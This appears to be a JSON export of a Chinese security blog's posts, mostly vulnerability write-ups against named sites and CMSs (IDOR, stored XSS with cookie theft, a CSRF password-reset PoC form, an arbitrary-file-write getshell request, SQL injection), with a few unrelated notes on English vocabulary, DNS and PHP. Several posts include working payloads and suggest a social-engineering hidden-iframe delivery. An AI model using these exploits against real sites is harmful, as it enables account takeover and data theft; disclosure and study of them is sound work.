Cai_Team","categories":[{"name":"乌云历史文章","slug":"乌云历史文章","permalink":"127.0.0.1/categories/乌云历史文章/"},{"name":"Web攻防","slug":"乌云历史文章/Web攻防","permalink":"127.0.0.1/categories/乌云历史文章/Web攻防/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"支付漏洞","slug":"支付漏洞","permalink":"127.0.0.1/tags/支付漏洞/"},{"name":"越权漏洞","slug":"越权漏洞","permalink":"127.0.0.1/tags/越权漏洞/"},{"name":"Xss漏洞","slug":"Xss漏洞","permalink":"127.0.0.1/tags/Xss漏洞/"},{"name":"密码逻辑漏洞","slug":"密码逻辑漏洞","permalink":"127.0.0.1/tags/密码逻辑漏洞/"}]},{"title":"暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)","slug":"暴风魔镜某处设计缺陷可获取整站用户信息","date":"2018-06-16T07:47:31.000Z","updated":"2018-06-16T09:20:00.877Z","comments":true,"path":"2018/06/16/暴风魔镜某处设计缺陷可获取整站用户信息/","link":"","permalink":"127.0.0.1/2018/06/16/暴风魔镜某处设计缺陷可获取整站用户信息/","excerpt":"危害：看文章自己脑补漏洞等级：高提交时间： 2016-04-20 18:15","text":"危害：看文章自己脑补漏洞等级：高提交时间： 2016-04-20 18:15 漏洞详情a、首先来到用户信息地址管理这边 b、编辑保存抓包 当前用户地址是48783 改了下48782就直接遍历出来了 c、下面直接遍历addressid d、burp里显示乱码 e、然后导出到本地就变成中文啦 证明危害即可遍历几条 f、地址管理处可以xss 可是只能x本地(self-xss)不太甘心 这个之前测试都是后台查看订单后才可以触发但是魔镜又贵 看了官网又挖不到支付漏洞宝宝不开心然后下载app测试了一下 哈哈 来着购物车抓包 g、修改num数量 1,-1 果然可以 h、随后就到了支付宝付款界面ok 这里要是提交订单后台查看xss应该可以触发 但是莫有钱 这边密码爆破任意用户密码重置，因为之前我遍历了所有用户的信息包括手机号，这个可以配合一下直接重置任意用户咯，这里不做破坏就拿自己的来 虽然验证码是6位数的，但是60分钟应该够了 转载者想说的话mmp，这个文章是我转载最难转载的一篇，没有之一，其中原因不多说，原文地址:http://wy.daochuan.net/bug_detail.php?wybug_id=wooyun-2016-0198593 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"乌云历史文章","slug":"乌云历史文章","permalink":"127.0.0.1/categories/乌云历史文章/"},{"name":"Web攻防","slug":"乌云历史文章/Web攻防","permalink":"127.0.0.1/categories/乌云历史文章/Web攻防/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"支付漏洞","slug":"支付漏洞","permalink":"127.0.0.1/tags/支付漏洞/"},{"name":"越权漏洞","slug":"越权漏洞","permalink":"127.0.0.1/tags/越权漏洞/"},{"name":"Xss漏洞","slug":"Xss漏洞","permalink":"127.0.0.1/tags/Xss漏洞/"},{"name":"密码逻辑漏洞","slug":"密码逻辑漏洞","permalink":"127.0.0.1/tags/密码逻辑漏洞/"}]},{"title":"乌云某处逻辑错误导致越权","slug":"乌云某处逻辑错误导致越权","date":"2018-06-15T15:08:04.000Z","updated":"2018-06-15T16:12:52.214Z","comments":true,"path":"2018/06/15/乌云某处逻辑错误导致越权/","link":"","permalink":"127.0.0.1/2018/06/15/乌云某处逻辑错误导致越权/","excerpt":"危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）漏洞等级：低危提交时间： 2016-06-23 12:05","text":"危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）漏洞等级：低危提交时间： 2016-06-23 12:05 打开漏洞后，点击“给漏洞作者发送礼物”，通过抓包即可得到含有该漏洞提交者的whitehatid，相应链接为： 1http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111 id为1的厂商向whitehatid为11111的白帽子发送礼物接收提醒，因此提交此漏洞的白帽子whitehatid为11111. 在获取到白帽子的whitehatid后，只需找到一个地方能够对应到白帽子的乌云id即可； 可能获知whitehatid白帽子id的对应方法还有其他的，这里我仅用了下面这个来实现。 访问以下链接，向该白帽子索取联系方式（但无需白帽子确认） 1http://www.wooyun.org/actdo.php?action=sms&amp;do=contactwhitehat&amp;whitehatid=11111 接着继续访问以下链接提醒白帽子接收礼物 1http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111 经测试发现，只要厂商曾经尝试索取白帽子联系方式后（不管是否成功获取），再提醒白帽子接收礼物，即可在厂商信息主页处看到给**发送礼物，此时白帽子的乌云ID就出来了。 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"乌云历史文章","slug":"乌云历史文章","permalink":"127.0.0.1/categories/乌云历史文章/"},{"name":"Web攻防","slug":"乌云历史文章/Web攻防","permalink":"127.0.0.1/categories/乌云历史文章/Web攻防/"}],"tags":[{"name":"权限失控","slug":"权限失控","permalink":"127.0.0.1/tags/权限失控/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"}]},{"title":"漏洞挖掘经验之联想游戏论坛存在\"奇异\"反射Xss","slug":"漏洞挖掘经验之联想游戏论坛存在奇异反射Xss","date":"2018-06-15T08:51:53.000Z","updated":"2018-06-21T15:52:27.549Z","comments":true,"path":"2018/06/15/漏洞挖掘经验之联想游戏论坛存在奇异反射Xss/","link":"","permalink":"127.0.0.1/2018/06/15/漏洞挖掘经验之联想游戏论坛存在奇异反射Xss/","excerpt":"内部文章，禁止外泄!","text":"内部文章，禁止外泄! 漏洞URL : http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153 0. 我们开始打开漏洞的地址这里是需要登录或者注册，到时候自己注册登录一下就可以看到如下这个界面了。 1. 插入Xss代码在帖子的评论区域插入代码&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;,如图 说实话也是运气好，我这段代码很早以前就插进去了，在电脑版的网页中，没有弹窗，但换到手机版本却有奇效（大家一定要多多测试，不要漏掉每一个细节） 2. 打开帖子查看 点击帖子处后可以看到下图的效果 可以看到这里已经弹窗了，那么我们再深入利用一下 3. 接着查看下是否有接受到Cookie 成功获取到Cookie，说明是存在Xss的 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"内部资料","slug":"内部资料","permalink":"127.0.0.1/categories/内部资料/"},{"name":"实战渗透","slug":"内部资料/实战渗透","permalink":"127.0.0.1/categories/内部资料/实战渗透/"},{"name":"Web攻防","slug":"内部资料/实战渗透/Web攻防","permalink":"127.0.0.1/categories/内部资料/实战渗透/Web攻防/"},{"name":"作者：一条快乐的咸鱼","slug":"内部资料/实战渗透/Web攻防/作者：一条快乐的咸鱼","permalink":"127.0.0.1/categories/内部资料/实战渗透/Web攻防/作者：一条快乐的咸鱼/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"Xss漏洞","slug":"Xss漏洞","permalink":"127.0.0.1/tags/Xss漏洞/"}]},{"title":"漏洞挖掘经验之联想E采存在Csrf漏洞","slug":"漏洞挖掘之联想E采存在Csrf漏洞","date":"2018-06-14T15:27:24.000Z","updated":"2018-06-14T16:02:43.105Z","comments":true,"path":"2018/06/14/漏洞挖掘之联想E采存在Csrf漏洞/","link":"","permalink":"127.0.0.1/2018/06/14/漏洞挖掘之联想E采存在Csrf漏洞/","excerpt":"内部资料，禁止外泄! 危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~","text":"内部资料，禁止外泄! 危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~ 先注册两个账号，邮箱分别为 clickjacking@126.com 和 623425849@qq.com,其中 623425849@qq.com 的密码为 12345678aa这里都按照正常流程操作,在忘记密码处输入用户名clickjacking@126.com 点下一步，输入邮箱发送过来的验证码. 点下一步，输入新密码，抓包. 将数据包制作成Csrf Poc，如下123456789&lt;html&gt;&lt;body&gt;&lt;form style=\"display:none;\" name=\"px\" method=\"post\" action=\"http://vip.lenovo.com.cn/Account/ForgotPassword/UpdateForgotPassword\"&gt; &lt;input type=\"hidden\" name=\"newPassword1\" value=\"123456789aa&amp;#126;\" /&gt; &lt;input type=\"hidden\" name=\"newPassword2\" value=\"123456789aa&amp;#126;\" /&gt; &lt;input type=\"hidden\" name=\"next\" value=\"�&amp;#184;&amp;#139;�&amp;#184;&amp;#128;�&amp;#173;&amp;#165;\" /&gt;&lt;/FORM&gt;&lt;script&gt;document.px.submit();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 浏览器处打开html文件 我们再输入原先的密码 可以看到是失败的 输入新密码123456789aa~ 发现可以登录，说明Csrf漏洞利用成功 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"内部资料","slug":"内部资料","permalink":"127.0.0.1/categories/内部资料/"},{"name":"实战渗透","slug":"内部资料/实战渗透","permalink":"127.0.0.1/categories/内部资料/实战渗透/"},{"name":"Web攻防","slug":"内部资料/实战渗透/Web攻防","permalink":"127.0.0.1/categories/内部资料/实战渗透/Web攻防/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"127.0.0.1/tags/逻辑漏洞/"},{"name":"Csrf漏洞","slug":"Csrf漏洞","permalink":"127.0.0.1/tags/Csrf漏洞/"}]},{"title":"漏洞挖掘经验之联想两处越权漏洞","slug":"漏洞挖掘经验之联想两处越权漏洞","date":"2018-06-13T11:52:02.000Z","updated":"2018-06-21T16:09:28.064Z","comments":true,"path":"2018/06/13/漏洞挖掘经验之联想两处越权漏洞/","link":"","permalink":"127.0.0.1/2018/06/13/漏洞挖掘经验之联想两处越权漏洞/","excerpt":"内部资料，禁止外泄！","text":"内部资料，禁止外泄！ 漏洞Url：https://moc.lenovo.com 联想某企业网站解散企业处越权漏洞1. 创建两个企业号，id分别为100645 and 100643 2. 打开url：https://moc.lenovo.com/moc/home_settings.do3. 点击解散企业 4.在二次验证界面输入当前账号的密码并抓包 5.找到这个数据包，当前企业id为100643，将其改为100645. 6.发送成功 7.刚才id为100645的企业已被解散 创建企业处越权漏洞 漏洞url/位置：https://moc.lenovo.com/moc/home_login_callback.do 复现步骤：1.创建两个账户，都不先不选择创建企业。2.选择任一账户，点击创建企业： 3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号： 4.发送成功，回显success 5.登陆到另一个账户中，发现果然创建成功 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"内部资料","slug":"内部资料","permalink":"127.0.0.1/categories/内部资料/"},{"name":"Web攻防","slug":"内部资料/Web攻防","permalink":"127.0.0.1/categories/内部资料/Web攻防/"},{"name":"作者：逗逗","slug":"内部资料/Web攻防/作者：逗逗","permalink":"127.0.0.1/categories/内部资料/Web攻防/作者：逗逗/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"127.0.0.1/tags/漏洞挖掘/"},{"name":"越权漏洞","slug":"越权漏洞","permalink":"127.0.0.1/tags/越权漏洞/"},{"name":"实战渗透","slug":"实战渗透","permalink":"127.0.0.1/tags/实战渗透/"}]},{"title":"英语词汇学习","slug":"英语词汇学习","date":"2018-06-07T15:48:22.000Z","updated":"2018-06-11T13:09:56.828Z","comments":true,"path":"2018/06/07/英语词汇学习/","link":"","permalink":"127.0.0.1/2018/06/07/英语词汇学习/","excerpt":"巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~","text":"巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~ back中文:后背读音:ba(第四声)可 bake中文:烘焙读音:bei(第四声)可 easy中文:容易读音:衣ji strong中文:强壮读音:死状 fee中文:费用读音:fei(四) fly中文:飞读音:福来句子( 加深记忆 ):他的福气是 飞 过来的 leave中文:离开读音:离(四)唔 sleeve中文:袖子读音:使力舞 leave和sleeve造句：悄悄的我leave(走了),正如我悄悄的来我挥一挥sleeve(衣袖),不带走一片云彩 drag中文:拖、拽读音：拽胳 push中文：推读音：怕使图解： pull中文：拉读音：po(四)图解: chart中文：图纸读音：插纸 cruel中文：残酷读音：哭咯句子：因为现实很 残酷 所以他 哭咯 debt中文：债务读音：贷te句子：他欠了债务，所以有很多贷te等他还 rude中文：粗鲁，无礼读音：入的句子：他不敲门就进 入 我的房间，这很 粗鲁 ，很无礼 fine中文: 好的 n.罚款读音：fai(四)句子：罚款只是为了你变 fine(好的) finance中文：金融读音：犯难事句子：金融方面遇到了问题，所以我犯难事 deliver中文：递送 分娩 发言读音：递里我句子： 交出一个东西-&gt;递送 交出一个孩子-&gt;分娩 交出一个意见-&gt;发言 mud中文：泥读音：骂的句子：我浑身是泥，所以我给家长骂的哭了 pet中文：宠物读音：陪(四)它句子：我养了一只宠物，我天天陪它 pest中文：害虫读音：拍死他句子：这个害虫有毒，我要拍死他 gift中文：礼物读音：给(四)福特句子：他礼物是给福特的 respond中文：回答，答复读音：瑞是棒的句子：瑞同学回答了这个问题，所以大家都在喊瑞是棒的 response中文：响应读音：瑞士胖死句子：瑞士有一个人胖死了，政府没做出响应 responsible中文：尽责的读音：瑞士胖死婆句子：及时做出respond，他很尽责的 correspond中文：符合，通信 terrible中文：可怕的，糟糕的读音：胎若爆句子：在高速公路上，胎若爆了，就会很可怕 terrify中文：恐吓 terror中文：恐怖读音：泰罗句子：程序又报错(error)了，真的是太恐怖了 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"英语学习","slug":"英语学习","permalink":"127.0.0.1/categories/英语学习/"}],"tags":[{"name":"English","slug":"English","permalink":"127.0.0.1/tags/English/"},{"name":"扩大业务必备技能","slug":"扩大业务必备技能","permalink":"127.0.0.1/tags/扩大业务必备技能/"}]},{"title":"[TP5]自定义配置文件","slug":"TP5-自定义配置文件","date":"2018-06-06T10:10:42.000Z","updated":"2018-06-06T10:10:42.805Z","comments":true,"path":"2018/06/06/TP5-自定义配置文件/","link":"","permalink":"127.0.0.1/2018/06/06/TP5-自定义配置文件/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[],"tags":[]},{"title":"[TP5]扩展配置目录","slug":"TP5-扩展配置目录","date":"2018-06-06T10:10:25.000Z","updated":"2018-06-06T10:10:25.874Z","comments":true,"path":"2018/06/06/TP5-扩展配置目录/","link":"","permalink":"127.0.0.1/2018/06/06/TP5-扩展配置目录/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[],"tags":[]},{"title":"[TP5]配置文件格式","slug":"TP5-配置文件格式","date":"2018-06-06T10:10:12.000Z","updated":"2018-06-06T10:10:12.417Z","comments":true,"path":"2018/06/06/TP5-配置文件格式/","link":"","permalink":"127.0.0.1/2018/06/06/TP5-配置文件格式/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[],"tags":[]},{"title":"TP5入口文件","slug":"[TP5]入口文件","date":"2018-06-06T10:08:33.000Z","updated":"2018-06-06T10:15:03.753Z","comments":true,"path":"2018/06/06/[TP5]入口文件/","link":"","permalink":"127.0.0.1/2018/06/06/[TP5]入口文件/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"编程语言","slug":"编程语言","permalink":"127.0.0.1/categories/编程语言/"},{"name":"Web开发","slug":"编程语言/Web开发","permalink":"127.0.0.1/categories/编程语言/Web开发/"}],"tags":[{"name":"thinkphp5框架","slug":"thinkphp5框架","permalink":"127.0.0.1/tags/thinkphp5框架/"},{"name":"网站开发","slug":"网站开发","permalink":"127.0.0.1/tags/网站开发/"}]},{"title":"旁注攻击","slug":"旁注攻击","date":"2018-06-05T15:20:08.000Z","updated":"2018-06-05T15:28:35.180Z","comments":true,"path":"2018/06/05/旁注攻击/","link":"","permalink":"127.0.0.1/2018/06/05/旁注攻击/","excerpt":"旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击","text":"旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击 简单的举个栗子，比如一个服务器有如下站点: 当攻击者在攻击www.iamfree.a的时候，没有发现漏洞，无法拿下此站点，那么攻击者就可以通过攻击www.iamfree.b并且成功攻破，得到了Root权限，那么这里不但www.iamfree.a的数据会被泄露，www.iamfree.b的数据也同样会被泄露，而www.iamfree.c网站是不会受到影响的。因为他不与www.iamfree.b在同一个数据库。但也不是说绝对的安全的，攻击者也可以通过数据库提权的方式获取到服务器管理员的权限，从而获取Access数据库里的内容。 大网站也存在有旁注攻击的风险，比如:qq.com，他有很多子域名，如图如此多的子域名，不可能说每个站点都一定是安全的，所以我们可以子域名来渗透到主域名。 那么疑问来了，攻击者怎么知道目标服务器上放置了哪些网站呢？这时候就要用到 IP逆向查询了。 IP逆向查询在线查询服务器下有哪些站点的网站： https://www.yougetsignal.com/tools/web-sites-on-web-server/ http://s.tool.chinaz.com/same/ https://dns.aizhan.com/ 利用必应搜索引擎来IP逆向查询 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"旁站攻击","slug":"旁站攻击","permalink":"127.0.0.1/tags/旁站攻击/"}]},{"title":"对chanzhi企业门户系统的一次测试","slug":"对chanzhi企业门户系统的一次测试","date":"2018-06-04T14:19:37.000Z","updated":"2018-06-04T14:28:49.666Z","comments":true,"path":"2018/06/04/对chanzhi企业门户系统的一次测试/","link":"","permalink":"127.0.0.1/2018/06/04/对chanzhi企业门户系统的一次测试/","excerpt":"系统官网:http://www.chanzhi.org/?v=7.0.1安装步骤之类的就省去了，直接开始测试","text":"系统官网:http://www.chanzhi.org/?v=7.0.1安装步骤之类的就省去了，直接开始测试 Csrf+Xss漏洞漏洞复现过程：漏洞处:后台-&gt;内容-&gt;维护目录( www.yousite.xxx/www/admin.php?m=tree&amp;f=browse&amp;type=article ) 尝试输入一些恶意代码:这里因为发现没有过滤，所以存在Xss漏洞，但是这里我们是不可能插入的(除非管理员自己插入的，那么，我们就来看看有没有Csrf漏洞可以结合一下)，然后就想着用Burp抓包分析一下，发现有戏~ 用Burp抓包分析一波，并且放入Repeater模块这里并没有发现有Token验证，那么我们来利用Burp自带的生成Csrf Poc 右键-&gt;Engagement tools-&gt;Generate Csrf PoC 自动写出PoC，我们直接复制到本地的HTML文件里 在浏览器中打开这个生成的PoC ok，存在Csrf漏洞 我们可以利用社工来把这个文件发送给管理员，如果管理员选择了打开的话那么就可以盗取他的Cookie了，那么很多人会问，管理员看到这样的界面肯定会不点击啦，那么我给你一个思路，就是把csrf_poc的代码放在 1.html 文件( 把点击提交修改为自动提交 )，然后把2.html文件用 iframe标签把 1.html 文件嵌入 并且把iframe标签透明度设置为100%，那么管理员打开后就会自动提交表单并且不会展示在2.html页面上~~~ 本来还想写另一个漏洞的，可惜无法绕过，实属能力有限 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"Xss","slug":"Xss","permalink":"127.0.0.1/tags/Xss/"},{"name":"Csrf","slug":"Csrf","permalink":"127.0.0.1/tags/Csrf/"}]},{"title":"uqcms的后台GetShell和前台越权删除他人图片","slug":"uqcms的后台GetShell和前台越权删除他人图片","date":"2018-06-03T04:06:17.000Z","updated":"2018-06-03T04:25:27.623Z","comments":true,"path":"2018/06/03/uqcms的后台GetShell和前台越权删除他人图片/","link":"","permalink":"127.0.0.1/2018/06/03/uqcms的后台GetShell和前台越权删除他人图片/","excerpt":"qucms是一个B2B2C多商户电商系统 结合多年的电商开发经验推出B2B2C多店铺系统，是目前国内最优秀的电商平台之一，系统设计为“平台自营+供应商入驻”的电商运营模式，系统支持佣金结算、区域团购、实时物流、售后服务等基础功能；为电商运营商提供最优质的系统和服务。 该程序采用非常流行的PHP作为开发语言，给很多广大开发者一个容易上手，能快速进入业务，成熟的语言架构，去除无用直达高效的设计，给企业快速开发，赢的市场。","text":"qucms是一个B2B2C多商户电商系统 结合多年的电商开发经验推出B2B2C多店铺系统，是目前国内最优秀的电商平台之一，系统设计为“平台自营+供应商入驻”的电商运营模式，系统支持佣金结算、区域团购、实时物流、售后服务等基础功能；为电商运营商提供最优质的系统和服务。 该程序采用非常流行的PHP作为开发语言，给很多广大开发者一个容易上手，能快速进入业务，成熟的语言架构，去除无用直达高效的设计，给企业快速开发，赢的市场。 1. 后台GETSHELL打开URLwww.yousite.xxx?m=template后，呈现这个页面:点击进入目录 随便点击一个编辑，然后用Burp抓包( 用不用都可以 ) 单击提交后用Burp抓包，抓到的数据如下图 我们将filename修改为phpinfo.php，把content修改为&lt;?php phpinfo();?&gt; 修改后的数据包:123456789101112131415POST /admin.php?m=template&amp;a=save&amp;jq_time=1527933067821 HTTP/1.1Host: www.iamfree.cccUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.iamfree.ccc/admin.php?m=template&amp;a=edit&amp;path=default.top.htmlContent-Length: 2886Cookie: PHPSESSID=b3uto19lpaa0mbbg4rudn9oqt0; goods[cart]=180602173948571025Connection: closefilename=phpinfo.php&amp;content=&lt;?php phpinfo();?&gt; 然后就会在根目录创建一个名为phpinfo.php的文件，并且内容为&lt;?php phpinfo();?&gt; 访问phpinfo.php文件，完成GETSHELL: 漏洞代码处：1234567891011121314public function save() &#123; if ($_POST) &#123; $file = P('filename', '修改的文件名不能为空'); $content = P('content'); $query = file_put_contents($file, stripslashes_deep($content)); if ($query) &#123; right_json(); &#125; else &#123; error_json('保存失败'); &#125; &#125; else &#123; error_json('提交错误'); &#125; &#125; 加上这三段代码，便于调试 把Burp抓的包放到Repeater( 按住ctrl+r )模块里file_put_contents的返回值是第二个参数的长度 这里因为没有做任何过滤，所以这里导致了任意文件写入漏洞 前台任意删除他人图片:漏洞处: 进入商家登陆 登陆后，单击装修 点击相册列表，并且上传图片 漏洞讲解开始首先选择这个ID为1566的那张图片点击删除，并且用Burp进行抓包: 我们首先随便输入一下错误的语法( 方便看到他的执行了什么语句 ): 可以看到他执行的SQL语句是:1select id,shop_id,url from uq_album where shop_id = 4 and id = 1566 or xxxx #查询uq_album表中条件为shop_id=4与id=1566的id和shop_id和url 我们现在身为test2想把test1的图片删了，那么我们就构造一下sql语句~ 1select id,shop_id,url from uq_album where shop_id = 4 and id = 1566 or shop_id in (5) 可以看见这里有3条数据被展现出来了，也就是test2上传的图片 然后我们开始执行一下这个构造的SQL语句: 然后我们发现那3条数据就没了: 代码处: 下次补 手机已经扣了4元了 出不起了 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"0day","slug":"0day","permalink":"127.0.0.1/tags/0day/"},{"name":"Cms漏洞挖掘","slug":"Cms漏洞挖掘","permalink":"127.0.0.1/tags/Cms漏洞挖掘/"},{"name":"白盒审计","slug":"白盒审计","permalink":"127.0.0.1/tags/白盒审计/"}]},{"title":"OSI七层模型","slug":"OSI七层模型","date":"2018-05-27T09:58:26.000Z","updated":"2018-05-27T10:02:08.000Z","comments":true,"path":"2018/05/27/OSI七层模型/","link":"","permalink":"127.0.0.1/2018/05/27/OSI七层模型/","excerpt":"","text":"十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"思科认证","slug":"思科认证","permalink":"127.0.0.1/categories/思科认证/"}],"tags":[{"name":"OSI七成模型","slug":"OSI七成模型","permalink":"127.0.0.1/tags/OSI七成模型/"},{"name":"网络设备","slug":"网络设备","permalink":"127.0.0.1/tags/网络设备/"}]},{"title":"计算机是如何访问网站的","slug":"计算机是如何访问网站的","date":"2018-05-27T03:50:40.000Z","updated":"2018-05-27T09:57:02.000Z","comments":true,"path":"2018/05/27/计算机是如何访问网站的/","link":"","permalink":"127.0.0.1/2018/05/27/计算机是如何访问网站的/","excerpt":"我们都知道，计算机访问网站是通过域名( www.xxx.xxx )来访问一个网站的，其实并不是，下面我来讲解一下","text":"我们都知道，计算机访问网站是通过域名( www.xxx.xxx )来访问一个网站的，其实并不是，下面我来讲解一下 计算机是如何通过域名来访问一个网站的其实在很久以前中，是用 IP 来直接访问网站的，但是因为 IP 的数字过长，又不好记，所以现在都改用 www.xxx.xxx 的形式访问网站了，也就是域名，我们先来看看用 IP 来访问百度: 我们先打开CMD，输入命令ping www.baidu.com:可以看到百度的 IP 地址是183.232.231.172，我们用浏览器访问一下 可以看到这2个是一样的，那么下面就来说说原理 原理什么是DNS域名解析服务，简单的说网络的地址是数字组成的，例如百度的服务器地址是183.232.231.172，我们的电脑通过这个地址访问百度，但是这个数字记忆起来相当麻烦，于是就有了www.baidu.com这个更直观的表示方法，DNS就是连接这两者的服务。 也就是说，当我们每次访问www.baidu.com的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程： 算了我不说了，直接看图吧~(把这里的www.163.com看成是www.baidu.com，把那个1.1.1.1看成183.232.231.172)![image_1cefsiau26771tmn9t911471pnb13.png-571.3kB]3 接着可以看这个文章: https://blog.csdn.net/cloudox_/article/details/69669035 (我感觉我讲的肯定没他好，我不擅长表达这些概念上的知识，哈哈哈，其实是为了找借口溜~v~) 也就是说，当我们每次访问www.baidu.com的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程： 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"127.0.0.1/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"127.0.0.1/tags/计算机网络/"},{"name":"Dns","slug":"Dns","permalink":"127.0.0.1/tags/Dns/"},{"name":"必修课","slug":"必修课","permalink":"127.0.0.1/tags/必修课/"}]},{"title":"Nmap使用笔记","slug":"Nmap使用笔记","date":"2018-05-26T13:45:04.000Z","updated":"2018-05-27T03:40:54.000Z","comments":true,"path":"2018/05/26/Nmap使用笔记/","link":"","permalink":"127.0.0.1/2018/05/26/Nmap使用笔记/","excerpt":"渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。 从上面那句话中，可见信息收集是多么的重要，因此，Nmap成为渗透中不可少的神器","text":"渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。 从上面那句话中，可见信息收集是多么的重要，因此，Nmap成为渗透中不可少的神器 Nmap在网络扫描中常见作用: 查看存活的主机 扫描目标主机开放端口 鉴定安全过滤机制 识别目标主机的操作系统 查看目标主机的服务banner 利用脚本扫描漏洞 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"127.0.0.1/tags/信息收集/"}]},{"title":"PHP函数记录","slug":"PHP函数记录","date":"2018-05-26T12:12:10.000Z","updated":"2018-06-04T14:56:03.657Z","comments":true,"path":"2018/05/26/PHP函数记录/","link":"","permalink":"127.0.0.1/2018/05/26/PHP函数记录/","excerpt":"持续更新中,此笔记正确食用方式是用于学习与代码审计~","text":"持续更新中,此笔记正确食用方式是用于学习与代码审计~ 不显示错误信息:error_reporting(0) 文件包含函数:include()、include_once()、require()、require_once() 开启session:session_start() 是否开启了gpc功能:if( !get_magic_quotes_gpc() ){} 过滤函数:addslashes()入敏感的内容会被转义(\\) 等号用处分类：123451、=：赋值，在逻辑运算时也有效；2、==：等于运算，但是不比较值的类型；3、===：完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。 chdir用法: mkdir用法: 123&lt;?php mkdir('1.iamfree') //会在当前目录下创建一个1.iamfree文件夹?&gt; const用法：12345678&lt;?php const name='iamfree'; echo name;/*输出:iamfree*/?&gt; htmlspecialchars()函数： readfile()用法： 定义和用法 readfile() 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的内容与字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。 readfile( filename,include_path,context ) 参数 描述 filename 必需。规定要读取的文件。 include_path 可选。如果也想在include_path中搜索文件，可以使用该参数并将其设为 true。 context 可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。 代码:1echo readfile( 'cai_team.txt' ); 执行转换: 字符 替换后 &amp; (&amp; 符号) &amp;amp; “ (双引号) &amp;quot;，除非设置了 ENT_NOQUOTES ‘ (单引号) 设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、ENT_XHTML 或 ENT_HTML5)。 &lt; (小于) &amp;lt > (大于) &amp;gt extract()函数: parse_str()： 123456 &lt;?php parse_str('name=iamfree'); //把name变成变量名，iamfree变成变量值 echo $name;//输出iamfree?&gt; import_request_variables(): 